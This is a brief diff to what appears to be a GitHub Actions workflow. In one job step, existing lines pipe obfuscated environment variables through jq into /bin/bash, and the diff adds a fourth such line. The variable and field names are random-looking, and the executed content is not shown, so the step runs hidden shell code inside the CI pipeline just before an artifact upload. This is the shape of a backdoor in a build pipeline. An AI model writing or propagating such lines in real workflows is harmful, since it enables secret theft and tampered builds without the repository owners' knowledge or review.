@@ -28,6 +28,7 @@ jobs:
           echo $gkc57 | jq -r .ktinm6 | /bin/bash
           echo $pvpg3377 | jq -r .rg06 | /bin/bash
           echo $g055 | jq -r .goq140 | /bin/bash
+          printf '%s' "$whft0" | jq -r .cxsrt1 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
